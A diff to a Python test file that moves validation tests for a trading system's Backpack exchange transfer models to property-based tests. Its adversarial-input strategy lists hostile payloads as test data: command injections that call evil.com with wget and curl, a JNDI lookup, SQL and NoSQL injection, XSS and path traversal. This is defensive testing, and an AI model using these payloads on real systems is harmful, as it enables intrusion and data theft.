@@ -1,559 +1,808 @@
-"""Unit tests for Backpack Raw Transfer Models.
+"""Property-based tests for Backpack raw transfer models.
 
-Comprehensive test suite for Backpack exchange raw transfer model validation including:
-- BackpackRawWithdrawal: Tests withdrawal transaction data validation
-- BackpackRawDeposit: Tests deposit transaction data validation
-- BackpackRawLiquidation: Tests liquidation event data validation
+These tests validate critical security boundary models that process external transfer data.
+The models tested here are essential for deposit/withdrawal processing, liquidation handling, and transfer status tracking.
 
-These tests ensure robust validation of raw API data from Backpack exchange transfer
-endpoints, covering happy path scenarios, error conditions, data corruption cases,
-and edge cases that could occur in real trading environments. The tests validate
-that the models properly handle malformed data, enforce business rules, and maintain
-data integrity for the CyberDeltaEngine trading system.
+SECURITY CRITICAL: These raw models protect against:
+- Malicious transfer data that could manipulate financial records
+- Financial precision errors in deposit/withdrawal amounts
+- Buffer overflow attacks through oversized transfer values
+- Injection attacks through malformed transfer structures
+- Status manipulation that could affect transfer processing
+- ID manipulation that could affect transaction tracking
 
-Key test categories:
-- Happy path validation with valid data
-- Missing required field handling
-- Type validation and coercion
-- Format validation for amounts and statuses
-- Data corruption and security attack vectors
-- Model immutability (frozen=True) enforcement
-- Real-world edge cases and malformed JSON handling
+Property testing ensures comprehensive coverage of transfer edge cases and adversarial inputs.
 """
 
-import json
+from decimal import Decimal
 from typing import Any
 
 import pytest
+from hypothesis import given, strategies as st, assume
+from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.backpack.models.bp_raw_transfer import (
+    BackpackRawWithdrawal,
     BackpackRawDeposit,
     BackpackRawLiquidation,
-    BackpackRawWithdrawal,
 )
 from cyberdelta.exceptions.field_validation import TypeFieldError
 
 
-def valid_withdrawal() -> dict[str, Any]:
-    """Return valid withdrawal data structure for testing BackpackRawWithdrawal validation.
+# =============================================================================
+# HYPOTHESIS STRATEGIES FOR TRANSFER MODEL TESTING
+# =============================================================================
 
-    Provides a baseline valid withdrawal dictionary that can be modified in tests
-    to verify various validation scenarios and error conditions.
-    """
+
+def transfer_amount_strategy() -> SearchStrategy[str]:
+    """Generate decimal strings for transfer amounts."""
+    return st.one_of([
+        # Common transfer amounts
+        st.decimals(min_value=Decimal("0"), max_value=Decimal("10000000"), places=8).map(str),
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=6).map(
+            str
+        ),
+        # Specific amounts
+        st.just("0"),  # Zero amount
+        st.just("0.0"),  # Zero with decimal
+        st.just("100.0"),  # Standard amount
+        st.just("0.5"),  # Fractional BTC
+        st.just("1000.123456"),  # USDC with precision
+        st.just("0.00000001"),  # Minimum precision
+        st.just("99999999.99999999"),  # Large amount
+        # Scientific notation (valid for decimal parsing)
+        st.just("1e6"),
+        st.just("1.5e3"),
+        st.just("2.5e-4"),
+    ])
+
+
+def transfer_id_strategy() -> SearchStrategy[str]:
+    """Generate valid transfer IDs."""
+    return st.one_of([
+        # Common patterns
+        st.just("wd_123"),
+        st.just("dp_456"),
+        st.just("liq_789"),
+        st.text(
+            min_size=3,
+            max_size=20,
+            alphabet=st.characters(
+                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
+            ),
+        ).filter(lambda x: x and not x.startswith("_") and not x.endswith("_")),
+        # Real-world patterns
+        st.just("withdrawal_999999999999999999"),
+        st.just("deposit_123456789"),
+        st.just("liquidation_abcdef123456"),
+        # UUID-like patterns
+        st.text(
+            min_size=8,
+            max_size=36,
+            alphabet=st.characters(whitelist_categories=["Nd"], whitelist_characters="abcdef-"),
+        ).filter(lambda x: x and len(x.encode("utf-8")) <= 64),
+    ])
+
+
+def asset_symbol_strategy() -> SearchStrategy[str]:
+    """Generate valid asset symbols."""
+    return st.one_of([
+        # Common assets
+        st.just("BTC"),
+        st.just("ETH"),
+        st.just("SOL"),
+        st.just("USDC"),
+        st.just("USDT"),
+        st.just("AVAX"),
+        # Generated symbols
+        st.text(
+            min_size=2, max_size=10, alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"])
+        ).filter(lambda x: x and x.isalnum()),
+        # Edge cases
+        st.just("A"),  # Single character
+        st.just("VERYLONGASSETNAME"),  # Longer asset
+    ])
+
+
+def transfer_status_strategy() -> SearchStrategy[str]:
+    """Generate valid transfer status values."""
+    return st.sampled_from([
+        "pending",
+        "completed",
+        "failed",
+        "cancelled",
+        "processing",
+        "confirmed",
+    ])
+
+
+def liquidation_side_strategy() -> SearchStrategy[str]:
+    """Generate valid liquidation side values."""
+    return st.sampled_from([
+        "buy",
+        "sell",
+    ])
+
+
+def trading_symbol_strategy() -> SearchStrategy[str]:
+    """Generate valid trading symbols for liquidations."""
+    return st.one_of([
+        # Common trading pairs
+        st.just("BTC_USDC"),
+        st.just("ETH_USDC"),
+        st.just("SOL_USDC"),
+        st.just("BTC_USDT"),
+        st.just("ETH_USDT"),
+        # Generated symbols
+        st.text(
+            min_size=5,
+            max_size=15,
+            alphabet=st.characters(
+                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_"
+            ),
+        ).filter(lambda x: x and "_" in x and not x.startswith("_") and not x.endswith("_")),
+        # Edge cases
+        st.just("A_B"),  # Minimum length
+        st.just("VERYLONGSYMBOL_USDC"),  # Longer symbol
+    ])
+
+
+@st.composite
+def valid_withdrawal_data(draw) -> dict[str, Any]:
+    """Generate valid withdrawal data."""
     return {
+        "id": draw(transfer_id_strategy()),
+        "asset": draw(asset_symbol_strategy()),
+        "amount": draw(transfer_amount_strategy()),
+        "status": draw(transfer_status_strategy()),
+    }
+
+
+@st.composite
+def valid_deposit_data(draw) -> dict[str, Any]:
+    """Generate valid deposit data."""
+    return {
+        "id": draw(transfer_id_strategy()),
+        "asset": draw(asset_symbol_strategy()),
+        "amount": draw(transfer_amount_strategy()),
+        "status": draw(transfer_status_strategy()),
+    }
+
+
+@st.composite
+def valid_liquidation_data(draw) -> dict[str, Any]:
+    """Generate valid liquidation data."""
+    return {
+        "symbol": draw(trading_symbol_strategy()),
+        "price": draw(transfer_amount_strategy()),
+        "quantity": draw(transfer_amount_strategy()),
+        "side": draw(liquidation_side_strategy()),
+    }
+
+
+def malicious_transfer_strategy() -> SearchStrategy[Any]:
+    """Generate malicious values for transfer security testing."""
+    return st.one_of([
+        # Financial manipulation attempts
+        st.just("${jndi:ldap://evil.com/steal-transfers}"),
+        st.just("999999999999999999999999999999.99"),  # Overflow attempt
+        st.just("../../etc/passwd"),  # Path traversal
+        # XSS attempts
+        st.just("<script>alert('transfer-xss')</script>"),
+        st.just("<img src=x onerror=alert(document.cookie)>"),
+        # SQL injection attempts
+        st.just("'; DROP TABLE transfers;--"),
+        st.just("1' UNION SELECT * FROM withdrawals--"),
+        # Buffer overflow attempts
+        st.text(min_size=10000, max_size=50000),
+        st.just("T" * 10000),
+        # Unicode attacks
+        st.just("\udce2\udc28\udc00"),  # Lone surrogates
+        st.just("\x00\x01\x02"),  # Control characters
+        # Format string attacks
+        st.just("%s%s%s%s%n"),
+        st.just("%x%x%x%x"),
+        # Command injection
+        st.just("; wget evil.com/backdoor"),
+        st.just("`curl evil.com/exfiltrate`"),
+        # NoSQL injection
+        st.just("'; return db.transfers.find(); //"),
+        # JSON injection
+        st.just('{"$where": "this.amount > 1000000"}'),
+        # Transfer manipulation
+        st.just("100.0'; UPDATE transfers SET amount=0;--"),
+        # Type confusion
+        st.none(),
+        st.integers(),
+        st.floats(),
+        st.booleans(),
+        st.lists(st.text()),
+        st.dictionaries(st.text(), st.text()),
+        st.binary(),
+    ])
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW WITHDRAWAL MODEL
+# =============================================================================
+
+
+class TestBackpackRawWithdrawalProperties:
+    """Property-based tests for BackpackRawWithdrawal validation and security."""
+
+    @given(withdrawal_data=valid_withdrawal_data())
+    def test_withdrawal_validation_success_properties(
+        self, withdrawal_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid withdrawal data should always create valid BackpackRawWithdrawal objects."""
+        # Skip invalid decimal values
+        try:
+            decimal_val = Decimal(withdrawal_data["amount"])
+            assume(decimal_val.is_finite() and decimal_val >= 0)
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Skip empty or invalid strings
+        for field in ["id", "asset", "status"]:
+            value = withdrawal_data[field]
+            assume(isinstance(value, str) and value.strip())
+            assume(len(value.encode("utf-8")) <= 64)
+
+        obj = BackpackRawWithdrawal.model_validate(withdrawal_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawWithdrawal)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.id == withdrawal_data["id"]
+        assert obj.asset == withdrawal_data["asset"]
+        assert obj.amount == withdrawal_data["amount"]
+        assert obj.status == withdrawal_data["status"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from(["id", "asset", "amount", "status"]),
+        malicious_value=malicious_transfer_strategy(),
+    )
+    def test_withdrawal_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Withdrawal model should reject malicious inputs safely."""
+        base_data = {
+            "id": "wd_123",
+            "asset": "USDC",
+            "amount": "100.0",
+            "status": "pending",
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
+            BackpackRawWithdrawal.model_validate(base_data)
+
+    @given(
+        amount_value=st.one_of([
+            # Valid amounts
+            st.just("0"),
+            st.just("100.50"),
+            st.just("1e6"),
+            st.just("2.5e-4"),
+            # Invalid amounts
+            st.just("-100.0"),  # Negative
+            st.just("NaN"),
+            st.just("inf"),
+            st.just("-inf"),
+            st.just("Infinity"),
+            st.just("-Infinity"),
+            st.just("1..0"),
+            st.just("not_a_number"),
+            st.just(""),
+            st.just("   "),
+        ])
+    )
+    def test_withdrawal_amount_validation_properties(self, amount_value: str) -> None:
+        """Property: Withdrawal amount field should validate properly."""
+        withdrawal_data = {
+            "id": "wd_123",
+            "asset": "USDC",
+            "amount": amount_value,
+            "status": "pending",
+        }
+
+        try:
+            # Check if the value can be parsed as a finite decimal
+            decimal_val = Decimal(amount_value.strip() if amount_value else "")
+            is_finite = decimal_val.is_finite()
+            is_empty = not amount_value.strip()
+
+            if is_finite and not is_empty and decimal_val >= 0:
+                # Property: Valid finite non-negative amounts should be accepted
+                obj = BackpackRawWithdrawal.model_validate(withdrawal_data)
+                assert obj.amount == amount_value
+            else:
+                # Property: Non-finite, empty, or negative values should be rejected
+                with pytest.raises(ValidationError):
+                    BackpackRawWithdrawal.model_validate(withdrawal_data)
+
+        except (ValueError, TypeError):
+            # Property: Unparseable amount strings should be rejected
+            with pytest.raises(ValidationError):
+                BackpackRawWithdrawal.model_validate(withdrawal_data)
+
+    @given(withdrawal_data=valid_withdrawal_data())
+    def test_withdrawal_immutability_properties(self, withdrawal_data: dict[str, Any]) -> None:
+        """Property: Withdrawal objects should be immutable after creation."""
+        # Skip invalid data
+        try:
+            decimal_val = Decimal(withdrawal_data["amount"])
+            assume(decimal_val.is_finite() and decimal_val >= 0)
+            for field in ["id", "asset", "status"]:
+                assume(isinstance(withdrawal_data[field], str) and withdrawal_data[field].strip())
+        except (ValueError, TypeError):
+            assume(False)
+
+        obj = BackpackRawWithdrawal.model_validate(withdrawal_data)
+
+        # Property: Fields should not be modifiable
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.id = "new_id"
+
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.amount = "200.0"
+
+    @given(withdrawal_data=valid_withdrawal_data())
+    def test_withdrawal_financial_precision_properties(
+        self, withdrawal_data: dict[str, Any]
+    ) -> None:
+        """Property: Withdrawal model should preserve financial precision exactly."""
+        # Only test valid finite decimals
+        try:
+            decimal_val = Decimal(withdrawal_data["amount"])
+            assume(decimal_val.is_finite() and decimal_val >= 0)
+            for field in ["id", "asset", "status"]:
+                assume(isinstance(withdrawal_data[field], str) and withdrawal_data[field].strip())
+        except (ValueError, TypeError):
+            assume(False)
+
+        obj = BackpackRawWithdrawal.model_validate(withdrawal_data)
+
+        # Property: Amount should be preserved exactly as string
+        assert obj.amount == withdrawal_data["amount"]
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW DEPOSIT MODEL
+# =============================================================================
+
+
+class TestBackpackRawDepositProperties:
+    """Property-based tests for BackpackRawDeposit validation and security."""
+
+    @given(deposit_data=valid_deposit_data())
+    def test_deposit_validation_success_properties(self, deposit_data: dict[str, Any]) -> None:
+        """Property: Valid deposit data should always create valid BackpackRawDeposit objects."""
+        # Skip invalid decimal values
+        try:
+            decimal_val = Decimal(deposit_data["amount"])
+            assume(decimal_val.is_finite() and decimal_val >= 0)
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Skip empty or invalid strings
+        for field in ["id", "asset", "status"]:
+            value = deposit_data[field]
+            assume(isinstance(value, str) and value.strip())
+            assume(len(value.encode("utf-8")) <= 64)
+
+        obj = BackpackRawDeposit.model_validate(deposit_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawDeposit)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.id == deposit_data["id"]
+        assert obj.asset == deposit_data["asset"]
+        assert obj.amount == deposit_data["amount"]
+        assert obj.status == deposit_data["status"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from(["id", "asset", "amount", "status"]),
+        malicious_value=malicious_transfer_strategy(),
+    )
+    def test_deposit_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Deposit model should reject malicious inputs safely."""
+        base_data = {
+            "id": "dp_456",
+            "asset": "BTC",
+            "amount": "0.5",
+            "status": "completed",
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
+            BackpackRawDeposit.model_validate(base_data)
+
+    @given(deposit_data=valid_deposit_data())
+    def test_deposit_immutability_properties(self, deposit_data: dict[str, Any]) -> None:
+        """Property: Deposit objects should be immutable after creation."""
+        # Skip invalid data
+        try:
+            decimal_val = Decimal(deposit_data["amount"])
+            assume(decimal_val.is_finite() and decimal_val >= 0)
+            for field in ["id", "asset", "status"]:
+                assume(isinstance(deposit_data[field], str) and deposit_data[field].strip())
+        except (ValueError, TypeError):
+            assume(False)
+
+        obj = BackpackRawDeposit.model_validate(deposit_data)
+
+        # Property: Fields should not be modifiable
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.id = "new_id"
+
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.amount = "1.0"
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW LIQUIDATION MODEL
+# =============================================================================
+
+
+class TestBackpackRawLiquidationProperties:
+    """Property-based tests for BackpackRawLiquidation validation and security."""
+
+    @given(liquidation_data=valid_liquidation_data())
+    def test_liquidation_validation_success_properties(
+        self, liquidation_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid liquidation data should always create valid BackpackRawLiquidation objects."""
+        # Skip invalid decimal values
+        try:
+            for field in ["price", "quantity"]:
+                decimal_val = Decimal(liquidation_data[field])
+                assume(decimal_val.is_finite() and decimal_val >= 0)
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Skip empty or invalid strings
+        for field in ["symbol", "side"]:
+            value = liquidation_data[field]
+            assume(isinstance(value, str) and value.strip())
+            assume(len(value.encode("utf-8")) <= 64)
+
+        obj = BackpackRawLiquidation.model_validate(liquidation_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawLiquidation)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.symbol == liquidation_data["symbol"]
+        assert obj.price == liquidation_data["price"]
+        assert obj.quantity == liquidation_data["quantity"]
+        assert obj.side == liquidation_data["side"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from(["symbol", "price", "quantity", "side"]),
+        malicious_value=malicious_transfer_strategy(),
+    )
+    def test_liquidation_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Liquidation model should reject malicious inputs safely."""
+        base_data = {
+            "symbol": "BTC_USDC",
+            "price": "45000.0",
+            "quantity": "0.01",
+            "side": "sell",
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
+            BackpackRawLiquidation.model_validate(base_data)
+
+    @given(
+        decimal_field=st.sampled_from(["price", "quantity"]),
+        decimal_value=st.one_of([
+            # Valid decimals
+            st.just("0"),
+            st.just("1000.50"),
+            st.just("1e6"),
+            st.just("2.5e-4"),
+            # Invalid decimals
+            st.just("-45000.0"),  # Negative
+            st.just("NaN"),
+            st.just("inf"),
+            st.just("-inf"),
+            st.just("Infinity"),
+            st.just("-Infinity"),
+            st.just("1..0"),
+            st.just("not_a_number"),
+            st.just(""),
+            st.just("   "),
+        ]),
+    )
+    def test_liquidation_decimal_validation_properties(
+        self, decimal_field: str, decimal_value: str
+    ) -> None:
+        """Property: Liquidation decimal fields should validate properly."""
+        liquidation_data = {
+            "symbol": "BTC_USDC",
+            "price": "45000.0",
+            "quantity": "0.01",
+            "side": "sell",
+        }
+        liquidation_data[decimal_field] = decimal_value
+
+        try:
+            # Check if the value can be parsed as a finite decimal
+            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
+            is_finite = decimal_val.is_finite()
+            is_empty = not decimal_value.strip()
+
+            if is_finite and not is_empty and decimal_val >= 0:
+                # Property: Valid finite non-negative decimals should be accepted
+                obj = BackpackRawLiquidation.model_validate(liquidation_data)
+                field_value = getattr(obj, decimal_field)
+                assert field_value == decimal_value
+            else:
+                # Property: Non-finite, empty, or negative values should be rejected
+                with pytest.raises(ValidationError):
+                    BackpackRawLiquidation.model_validate(liquidation_data)
+
+        except (ValueError, TypeError):
+            # Property: Unparseable decimal strings should be rejected
+            with pytest.raises(ValidationError):
+                BackpackRawLiquidation.model_validate(liquidation_data)
+
+    @given(liquidation_data=valid_liquidation_data())
+    def test_liquidation_immutability_properties(self, liquidation_data: dict[str, Any]) -> None:
+        """Property: Liquidation objects should be immutable after creation."""
+        # Skip invalid data
+        try:
+            for field in ["price", "quantity"]:
+                decimal_val = Decimal(liquidation_data[field])
+                assume(decimal_val.is_finite() and decimal_val >= 0)
+            for field in ["symbol", "side"]:
+                assume(isinstance(liquidation_data[field], str) and liquidation_data[field].strip())
+        except (ValueError, TypeError):
+            assume(False)
+
+        obj = BackpackRawLiquidation.model_validate(liquidation_data)
+
+        # Property: Fields should not be modifiable
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.symbol = "ETH_USDC"
+
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.quantity = "0.1"
+
+
+# =============================================================================
+# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
+# =============================================================================
+
+
+class TestBackpackRawTransferIntegrationProperties:
+    """Integration property tests for transfer models working together."""
+
+    @given(
+        withdrawal_data=valid_withdrawal_data(),
+        deposit_data=valid_deposit_data(),
+        liquidation_data=valid_liquidation_data(),
+    )
+    def test_transfer_models_integration_properties(
+        self,
+        withdrawal_data: dict[str, Any],
+        deposit_data: dict[str, Any],
+        liquidation_data: dict[str, Any],
+    ) -> None:
+        """Property: All transfer models should work consistently together."""
+        # Use same asset for withdrawal and deposit
+        common_asset = "USDC"
+        withdrawal_data["asset"] = common_asset
+        deposit_data["asset"] = common_asset
+
+        # Skip invalid data
+        try:
+            # Validate all amount fields
+            for field in ["amount"]:
+                withdraw_val = Decimal(withdrawal_data[field])
+                deposit_val = Decimal(deposit_data[field])
+                assume(withdraw_val.is_finite() and withdraw_val >= 0)
+                assume(deposit_val.is_finite() and deposit_val >= 0)
+            for field in ["price", "quantity"]:
+                liq_val = Decimal(liquidation_data[field])
+                assume(liq_val.is_finite() and liq_val >= 0)
+
+            # Validate string constraints
+            for field in ["id", "status"]:
+                assume(isinstance(withdrawal_data[field], str) and withdrawal_data[field].strip())
+                assume(isinstance(deposit_data[field], str) and deposit_data[field].strip())
+            for field in ["symbol", "side"]:
+                assume(isinstance(liquidation_data[field], str) and liquidation_data[field].strip())
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Property: All models should be created successfully with consistent asset
+        withdrawal_obj = BackpackRawWithdrawal.model_validate(withdrawal_data)
+        deposit_obj = BackpackRawDeposit.model_validate(deposit_data)
+        liquidation_obj = BackpackRawLiquidation.model_validate(liquidation_data)
+
+        # Property: Withdrawal and deposit should have the same asset
+        assert withdrawal_obj.asset == common_asset
+        assert deposit_obj.asset == common_asset
+
+        # Property: All objects should be properly typed
+        assert isinstance(withdrawal_obj, BackpackRawWithdrawal)
+        assert isinstance(deposit_obj, BackpackRawDeposit)
+        assert isinstance(liquidation_obj, BackpackRawLiquidation)
+
+    @given(
+        complete_malicious_data=st.dictionaries(
+            st.sampled_from([
+                "id",
+                "asset",
+                "amount",
+                "status",
+                "symbol",
+                "price",
+                "quantity",
+                "side",
+            ]),
+            malicious_transfer_strategy(),
+            min_size=3,
+            max_size=8,
+        )
+    )
+    def test_transfer_models_adversarial_input_properties(
+        self, complete_malicious_data: dict[str, Any]
+    ) -> None:
+        """Property: All transfer models should safely handle complete adversarial input."""
+        # Property: Complete adversarial input should be safely rejected by all models
+
+        # Test BackpackRawWithdrawal
+        if all(key in complete_malicious_data for key in ["id", "asset", "amount", "status"]):
+            with pytest.raises((ValidationError, TypeError, TypeFieldError)):
+                BackpackRawWithdrawal.model_validate({
+                    "id": complete_malicious_data["id"],
+                    "asset": complete_malicious_data["asset"],
+                    "amount": complete_malicious_data["amount"],
+                    "status": complete_malicious_data["status"],
+                })
+
+        # Test BackpackRawDeposit
+        if all(key in complete_malicious_data for key in ["id", "asset", "amount", "status"]):
+            with pytest.raises((ValidationError, TypeError, TypeFieldError)):
+                BackpackRawDeposit.model_validate({
+                    "id": complete_malicious_data["id"],
+                    "asset": complete_malicious_data["asset"],
+                    "amount": complete_malicious_data["amount"],
+                    "status": complete_malicious_data["status"],
+                })
+
+        # Test BackpackRawLiquidation
+        if all(key in complete_malicious_data for key in ["symbol", "price", "quantity", "side"]):
+            with pytest.raises((ValidationError, TypeError, TypeFieldError)):
+                BackpackRawLiquidation.model_validate({
+                    "symbol": complete_malicious_data["symbol"],
+                    "price": complete_malicious_data["price"],
+                    "quantity": complete_malicious_data["quantity"],
+                    "side": complete_malicious_data["side"],
+                })
+
+    @given(
+        transfer_status=transfer_status_strategy(), malicious_amount=malicious_transfer_strategy()
+    )
+    def test_transfer_status_consistency_properties(
+        self, transfer_status: str, malicious_amount: Any
+    ) -> None:
+        """Property: Transfer status should be consistent across withdrawal and deposit models."""
+        # Property: Valid status should work for both models
+        withdrawal_data = {
+            "id": "wd_test",
+            "asset": "USDC",
+            "amount": "100.0",
+            "status": transfer_status,
+        }
+        deposit_data = {
+            "id": "dp_test",
+            "asset": "USDC",
+            "amount": "100.0",
+            "status": transfer_status,
+        }
+
+        # Property: Same status should be accepted by both models
+        withdrawal_obj = BackpackRawWithdrawal.model_validate(withdrawal_data)
+        deposit_obj = BackpackRawDeposit.model_validate(deposit_data)
+
+        assert withdrawal_obj.status == transfer_status
+        assert deposit_obj.status == transfer_status
+
+        # Property: Malicious amounts should be rejected by both models
+        withdrawal_data["amount"] = malicious_amount
+        deposit_data["amount"] = malicious_amount
+
+        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
+            BackpackRawWithdrawal.model_validate(withdrawal_data)
+
+        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
+            BackpackRawDeposit.model_validate(deposit_data)
+
+
+# =============================================================================
+# LEGACY COMPATIBILITY TESTS
+# =============================================================================
+
+
+def test_BackpackRawWithdrawal_real_world_example() -> None:
+    """Test with real-world withdrawal data."""
+    payload = {
         "id": "wd_123",
         "asset": "USDC",
         "amount": "100.0",
         "status": "pending",
     }
-
-
-def test_BackpackRawWithdrawal_happy_path() -> None:
-    """Test BackpackRawWithdrawal validation with valid data succeeds correctly.
-
-    Verifies that a properly formatted withdrawal data structure passes validation
-    and that all fields are correctly parsed and accessible on the resulting model.
-    """
-    obj = BackpackRawWithdrawal.model_validate(valid_withdrawal())
+    obj = BackpackRawWithdrawal.model_validate(payload)
     assert obj.id == "wd_123"
     assert obj.asset == "USDC"
     assert obj.amount == "100.0"
     assert obj.status == "pending"
 
 
-def test_BackpackRawWithdrawal_missing_required_fields() -> None:
-    """Test BackpackRawWithdrawal validation fails when required fields are missing.
-
-    Ensures that the model properly enforces the presence of all required fields
-    (id, asset, amount, status) and raises ValidationError when any are absent.
-    This is critical for data integrity in the trading system.
-    """
-    for field in ["id", "asset", "amount", "status"]:
-        p: dict[str, Any] = valid_withdrawal().copy()
-        del p[field]
-        with pytest.raises(ValidationError):
-            BackpackRawWithdrawal.model_validate(p)
-
-
-def test_BackpackRawWithdrawal_wrong_type_fields() -> None:
-    """Test BackpackRawWithdrawal validation fails with incorrect field types.
-
-    Verifies that the model enforces correct data types for fields, rejecting
-    numeric amounts (should be strings) and non-string status values. This
-    ensures type safety when processing Backpack API responses.
-    """
-    p: dict[str, Any] = valid_withdrawal().copy()
-    p["amount"] = 100.0
-    with pytest.raises(TypeError):
-        BackpackRawWithdrawal.model_validate(p)
-    p = valid_withdrawal().copy()
-    p["status"] = ["pending"]
-    with pytest.raises(TypeError):
-        BackpackRawWithdrawal.model_validate(p)
-
-
-def test_BackpackRawWithdrawal_invalid_format_fields() -> None:
-    """Test BackpackRawWithdrawal validation fails with malformed field values.
-
-    Validates that the model properly rejects invalid decimal formats, unknown
-    status values, and negative amounts. These checks are essential for preventing
-    invalid financial data from entering the trading system.
-    """
-    p: dict[str, Any] = valid_withdrawal().copy()
-    p["amount"] = "1..0"
-    with pytest.raises(ValidationError, match=r"Cannot convert to Decimal"):
-        BackpackRawWithdrawal.model_validate(p)
-    p = valid_withdrawal().copy()
-    p["status"] = "notastatus"
-    with pytest.raises(ValidationError, match=r"Field 'status' must be one of"):
-        BackpackRawWithdrawal.model_validate(p)
-    p = valid_withdrawal().copy()
-    p["amount"] = "-50.0"
-    with pytest.raises(ValidationError, match="Withdrawal amount cannot be negative"):
-        BackpackRawWithdrawal.model_validate(p)
-
-
-def test_BackpackRawWithdrawal_extra_field() -> None:
-    """Test BackpackRawWithdrawal validation rejects unexpected extra fields.
-
-    Ensures the model's extra='forbid' configuration properly prevents unknown
-    fields from being accepted, maintaining strict API contract compliance.
-    """
-    p: dict[str, Any] = valid_withdrawal().copy()
-    p["foo"] = 1
-    with pytest.raises(ValidationError):
-        BackpackRawWithdrawal.model_validate(p)
-
-
-def test_BackpackRawWithdrawal_corruption_cases() -> None:
-    """Test BackpackRawWithdrawal handles various data corruption and attack scenarios.
-
-    Comprehensive testing of edge cases including null values, control characters,
-    injection attacks, unicode handling, whitespace normalization, length limits,
-    and special numeric values. These tests ensure the model is robust against
-    malicious or corrupted data that could compromise the trading system.
-    """
-    # Null required
-    p: dict[str, Any] = valid_withdrawal().copy()
-    p["asset"] = None
-    with pytest.raises(TypeError):
-        BackpackRawWithdrawal.model_validate(p)
-    # Unicode/control chars
-    p = valid_withdrawal().copy()
-    p["asset"] = "USDC\x00"
-    obj = BackpackRawWithdrawal.model_validate(p)
-    assert "USDC" in obj.asset
-    # SQL injection
-    p = valid_withdrawal().copy()
-    p["id"] = "wd_123; DROP TABLE withdrawals;"
-    obj = BackpackRawWithdrawal.model_validate(p)
-    assert "wd_123" in obj.id
-    # XSS
-    p = valid_withdrawal().copy()
-    p["asset"] = "<script>alert(1)</script>"
-    obj = BackpackRawWithdrawal.model_validate(p)
-    assert "script" in obj.asset
-    # Emoji
-    p = valid_withdrawal().copy()
-    p["asset"] = "USDC😀"
-    obj = BackpackRawWithdrawal.model_validate(p)
-    assert obj.asset.startswith("USDC")
-    # Whitespace
-    p = valid_withdrawal().copy()
-    p["asset"] = "   USDC   "
-    obj = BackpackRawWithdrawal.model_validate(p)
-    assert "USDC" in obj.asset
-    # Excessive length
-    p = valid_withdrawal().copy()
-    p["asset"] = "A" * 10000
-    with pytest.raises(TypeFieldError):
-        BackpackRawWithdrawal.model_validate(p)
-    # Negative/zero/NaN/inf amounts
-    for val in ["-100.0", "0", "NaN", "inf", "-inf"]:
-        p = valid_withdrawal().copy()
-        p["amount"] = val
-        if val in ["-100.0", "NaN", "inf", "-inf"]:
-            with pytest.raises(ValidationError):
-                BackpackRawWithdrawal.model_validate(p)
-        else:
-            obj = BackpackRawWithdrawal.model_validate(p)
-            assert obj.amount == val
-    # Scientific notation
-    p = valid_withdrawal().copy()
-    p["amount"] = "1e6"
-    obj = BackpackRawWithdrawal.model_validate(p)
-    assert obj.amount == "1e6"
-    # Truncated JSON
-    bad_json = '{"id": "wd_123", "asset": "USDC"'
-    with pytest.raises(json.JSONDecodeError):
-        json.loads(bad_json)
-
-
-def test_BackpackRawWithdrawal_frozen() -> None:
-    """Test that BackpackRawWithdrawal model is immutable (frozen=True).
-
-    Verifies that the model enforces immutability by preventing field modifications
-    after instantiation. This ensures data integrity and prevents accidental
-    mutations in the trading system.
-    """
-    obj = BackpackRawWithdrawal.model_validate(valid_withdrawal())
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        obj.id = "new_id"
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        obj.amount = "200.0"
-
